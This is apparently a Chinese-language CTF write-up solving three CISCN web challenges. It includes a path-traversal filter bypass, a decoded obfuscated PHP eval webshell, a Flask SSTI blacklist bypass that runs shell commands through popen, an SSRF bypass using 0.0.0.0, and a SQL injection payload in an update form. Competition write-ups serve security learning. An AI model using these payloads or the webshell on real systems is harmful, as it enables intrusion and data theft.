<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h1 data-content="1" id="fc031e418cbad0d2cb977b72b8fd90eb">CISCN - WEB WP</h1>
<h2 data-content="1" id="7e876b640a515045d181b992687a1815">hello_web</h2>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241215170058-1975c5fa-bac3-1.png"/></p>
<p>查看源码发现存在tips.php和hackme.php，根据路由提示尝试文件读取</p>
<pre><code>http://ip/index.php?file=xxx</code></pre>
<p>读取之后发现有waf，这里可以双写绕过，即</p>
<pre><code>http://ip/index.php?file=..././hackme.php</code></pre>
<p>发包后即可得到一个混淆的php脚本</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241215170105-1e28791c-bac3-1.png"/></p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="nv">$lJbGIY</span><span class="o">=</span><span class="s2">"eQOLlCmTYhVJUnRAobPSvjrFzWZycHXfdaukqGgwNptIBKiDsxME"</span><span class="p">;</span><span class="nv">$OlWYMv</span><span class="o">=</span><span class="s2">"zqBZkOuwUaTKFXRfLgmvchbipYdNyAGsIWVEQnxjDPoHStCMJrel"</span><span class="p">;</span><span class="nv">$lapUCm</span><span class="o">=</span><span class="nb">urldecode</span><span class="p">(</span><span class="s2">"%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A"</span><span class="p">);</span>
<span class="nv">$YwzIst</span><span class="o">=</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">6</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span><span class="nv">$OxirhK</span><span class="o">=</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">33</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">24</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">10</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span><span class="nv">$YpAUWC</span><span class="o">=</span><span class="nv">$OxirhK</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">18</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">3</span><span class="p">}</span><span class="o">.</span><span class="nv">$OxirhK</span><span class="p">{</span><span class="mi">0</span><span class="p">}</span><span class="o">.</span><span class="nv">$OxirhK</span><span class="p">{</span><span class="mi">1</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">24</span><span class="p">};</span><span class="nv">$rVkKjU</span><span class="o">=</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">7</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">13</span><span class="p">};</span><span class="nv">$YwzIst</span><span class="o">.=</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">22</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">36</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">29</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">30</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">32</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">35</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">26</span><span class="p">}</span><span class="o">.</span><span class="nv">$lapUCm</span><span class="p">{</span><span class="mi">30</span><span class="p">};</span><span class="k">eval</span><span class="p">(</span><span class="nv">$YwzIst</span><span class="p">(</span><span class="s2">"JHVXY2RhQT0iZVFPTGxDbVRZaFZKVW5SQW9iUFN2anJGeldaeWNIWGZkYXVrcUdnd05wdElCS2lEc3hNRXpxQlprT3V3VWFUS0ZYUmZMZ212Y2hiaXBZZE55QUdzSVdWRVFueGpEUG9IU3RDTUpyZWxtTTlqV0FmeHFuVDJVWWpMS2k5cXcxREZZTkloZ1lSc0RoVVZCd0VYR3ZFN0hNOCtPeD09IjtldmFsKCc/PicuJFl3eklzdCgkT3hpcmhLKCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVKjIpLCRZcEFVV0MoJHVXY2RhQSwkclZrS2pVLCRyVmtLalUpLCRZcEFVV0MoJHVXY2RhQSwwLCRyVmtLalUpKSkpOw=="</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p>手动输出分析即可得到具体执行的内容</p>
<div class="highlight"><pre><span></span><span class="x">echo($YwzIst($OxirhK($YpAUWC($uWcdaA,$rVkKjU*2),$YpAUWC($uWcdaA,$rVkKjU,$rVkKjU),$YpAUWC($uWcdaA,0,$rVkKjU))));</span>
</pre></div>
<p>结果为</p>
<pre><code>PD9waHAgQGV2YWwoJF9QT1NUWydjbWRfNjYuOTknXSk7ID8+Cg==</code></pre>
<p>解码得到</p>
<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'cmd_66.99'</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241215170112-22414b50-bac3-1.png"/></p>
<p>连接蚁剑，但是发现有disable_function，尝试插件绕过</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241215170118-256f9fd4-bac3-1.png"/></p>
<p>利用find命令查找flag</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241215170121-27641ac2-bac3-1.png"/></p>
<h2 data-content="1" id="7512516a800331607977e66e2517e6ef">Safe_Proxy</h2>
<p>源码如下</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template_string</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">threading</span>
<span class="kn">import</span> <span class="nn">html</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"GET"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">source</span><span class="p">():</span>
    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s1">'r'</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
        <span class="k">return</span> <span class="s1">'&lt;pre&gt;'</span><span class="o">+</span><span class="n">html</span><span class="o">.</span><span class="n">escape</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span><span class="o">+</span><span class="s1">'&lt;/pre&gt;'</span>

<span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">template</span><span class="p">():</span>
    <span class="n">template_code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"code"</span><span class="p">)</span>
    <span class="c1"># 安全过滤</span>
    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'__'</span><span class="p">,</span> <span class="s1">'import'</span><span class="p">,</span> <span class="s1">'os'</span><span class="p">,</span> <span class="s1">'sys'</span><span class="p">,</span> <span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'subprocess'</span><span class="p">,</span> <span class="s1">'popen'</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\r</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">template_code</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">"Forbidden content detected!"</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template_code</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
    <span class="k">return</span> <span class="s1">'ok'</span> <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="s1">'error'</span>

<span class="k">class</span> <span class="nc">HTTPProxyHandler</span><span class="p">:</span>
    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">target_host</span> <span class="o">=</span> <span class="n">target_host</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">target_port</span> <span class="o">=</span> <span class="n">target_port</span>

    <span class="k">def</span> <span class="nf">handle_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">client_socket</span><span class="p">):</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">request_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
            <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                <span class="n">chunk</span> <span class="o">=</span> <span class="n">client_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
                <span class="n">request_data</span> <span class="o">+=</span> <span class="n">chunk</span>
                <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4096</span><span class="p">:</span>
                    <span class="k">break</span>

            <span class="k">if</span> <span class="ow">not</span> <span class="n">request_data</span><span class="p">:</span>
                <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
                <span class="k">return</span>

            <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">proxy_socket</span><span class="p">:</span>
                <span class="n">proxy_socket</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="bp">self</span><span class="o">.</span><span class="n">target_host</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">target_port</span><span class="p">))</span>
                <span class="n">proxy_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">request_data</span><span class="p">)</span>

                <span class="n">response_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">""</span>
                <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
                    <span class="n">chunk</span> <span class="o">=</span> <span class="n">proxy_socket</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
                    <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
                        <span class="k">break</span>
                    <span class="n">response_data</span> <span class="o">+=</span> <span class="n">chunk</span>

            <span class="n">header_end</span> <span class="o">=</span> <span class="n">response_data</span><span class="o">.</span><span class="n">rfind</span><span class="p">(</span><span class="sa">b</span><span class="s2">"</span><span class="se">\r\n\r\n</span><span class="s2">"</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">header_end</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
                <span class="n">body</span> <span class="o">=</span> <span class="n">response_data</span><span class="p">[</span><span class="n">header_end</span> <span class="o">+</span> <span class="mi">4</span><span class="p">:]</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">body</span> <span class="o">=</span> <span class="n">response_data</span>

            <span class="n">response_body</span> <span class="o">=</span> <span class="n">body</span>
            <span class="n">response</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"HTTP/1.1 200 OK</span><span class="se">\r\n</span><span class="s2">"</span> \
                       <span class="sa">b</span><span class="s2">"Content-Length: "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">response_body</span><span class="p">))</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> \
                       <span class="sa">b</span><span class="s2">"Content-Type: text/html; charset=utf-8</span><span class="se">\r\n</span><span class="s2">"</span> \
                       <span class="sa">b</span><span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span> <span class="o">+</span> <span class="n">response_body</span>

            <span class="n">client_socket</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Proxy Error: {e}"</span><span class="p">)</span>
        <span class="k">finally</span><span class="p">:</span>
            <span class="n">client_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">start_proxy_server</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">):</span>
    <span class="n">proxy_handler</span> <span class="o">=</span> <span class="n">HTTPProxyHandler</span><span class="p">(</span><span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">)</span>
    <span class="n">server_socket</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">server_socket</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">server_socket</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}..."</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">client_socket</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">server_socket</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>
            <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s2">"Connection from {addr}"</span><span class="p">)</span>
            <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">proxy_handler</span><span class="o">.</span><span class="n">handle_request</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">client_socket</span><span class="p">,))</span>
            <span class="n">thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
            <span class="n">thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">KeyboardInterrupt</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">"Shutting down proxy server..."</span><span class="p">)</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="n">server_socket</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">run_flask_app</span><span class="p">():</span>
    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">debug</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5000</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">"__main__"</span><span class="p">:</span>
    <span class="n">proxy_host</span> <span class="o">=</span> <span class="s2">"0.0.0.0"</span>
    <span class="n">proxy_port</span> <span class="o">=</span> <span class="mi">5001</span>
    <span class="n">target_host</span> <span class="o">=</span> <span class="s2">"127.0.0.1"</span>
    <span class="n">target_port</span> <span class="o">=</span> <span class="mi">5000</span>

    <span class="c1"># 安全反代，防止针对响应头的攻击</span>
    <span class="n">proxy_thread</span> <span class="o">=</span> <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">start_proxy_server</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">proxy_host</span><span class="p">,</span> <span class="n">proxy_port</span><span class="p">,</span> <span class="n">target_host</span><span class="p">,</span> <span class="n">target_port</span><span class="p">))</span>
    <span class="n">proxy_thread</span><span class="o">.</span><span class="n">daemon</span> <span class="o">=</span> <span class="bp">True</span>
    <span class="n">proxy_thread</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>

    <span class="k">print</span><span class="p">(</span><span class="s2">"Starting Flask app..."</span><span class="p">)</span>
    <span class="n">run_flask_app</span><span class="p">()</span>
</pre></div>
<p>写了一堆不相干的东西，我们只需要关注下面这段代码即可</p>
<div class="highlight"><pre><span></span><span class="nd">@app.route</span><span class="p">(</span><span class="s1">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s2">"POST"</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">template</span><span class="p">():</span>
    <span class="n">template_code</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">"code"</span><span class="p">)</span>
    <span class="c1"># 安全过滤</span>
    <span class="n">blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'__'</span><span class="p">,</span> <span class="s1">'import'</span><span class="p">,</span> <span class="s1">'os'</span><span class="p">,</span> <span class="s1">'sys'</span><span class="p">,</span> <span class="s1">'eval'</span><span class="p">,</span> <span class="s1">'subprocess'</span><span class="p">,</span> <span class="s1">'popen'</span><span class="p">,</span> <span class="s1">'system'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\r</span><span class="s1">'</span><span class="p">,</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">]</span>
    <span class="k">for</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">blacklist</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">black</span> <span class="ow">in</span> <span class="n">template_code</span><span class="p">:</span>
            <span class="k">return</span> <span class="s2">"Forbidden content detected!"</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template_code</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
    <span class="k">return</span> <span class="s1">'ok'</span> <span class="k">if</span> <span class="n">result</span> <span class="ow">is</span> <span class="ow">not</span> <span class="bp">None</span> <span class="k">else</span> <span class="s1">'error'</span>
</pre></div>
<p>简单的waf，直接拼接绕过即可，题目不出网，写静态目录绕过即可</p>
<pre><code>code={%print(config|attr('_''_class_''_')|attr('_''_init_''_')|attr('_''_globals_''_')|attr('_''_getitem_''_')('o''s')|attr('po''pen')('mkdir static;cat /f* &gt; static/a')|attr('read')())%}</code></pre>
<p>访问static/a拿到执行结果</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241215170130-2cdd9546-bac3-1.png"/></p>
<h2 data-content="1" id="be703c736f45f64fb87a58d8f48a0e46">sxweb2</h2>
<p>去掉index可以得到一大堆路由</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241215170153-3ac8cb62-bac3-1.png"/></p>
<p>有一个flag.py的路由，访问发现403</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241215170159-3e0afbba-bac3-1.png"/></p>
<p>还有个wget.py，猜测存在ssrf，利用0.0.0.0绕过127.0.0.1</p>
<div class="highlight"><pre><span></span>cgi-bin/wget.py?url<span class="o">=</span>http://0.0.0.0/cgi-bin/local/flag.py
</pre></div>
<p>得到提示要让所有的人都被签约，根据他提供的更新路由我们可以猜测出应该是存在sql注入的，要更新签约的值，进行测试后发现在city的位置'会出现无法回显的情况，猜测这个就是注入点，利用下面的payload进行注入</p>
<pre><code>au_id=893-72-1158&amp;au_lname=McBadden&amp;au_fname=Heather&amp;phone=707+448-4982&amp;address=301+Putnam&amp;city=aa',contract=1%20where%20au_id='893-72-1158'--+&amp;state=CA&amp;zip=95688</code></pre>
<p>修改au_id将所有的0都改成1，再访问flag.py即可拿到flag</p>
</div>
</div>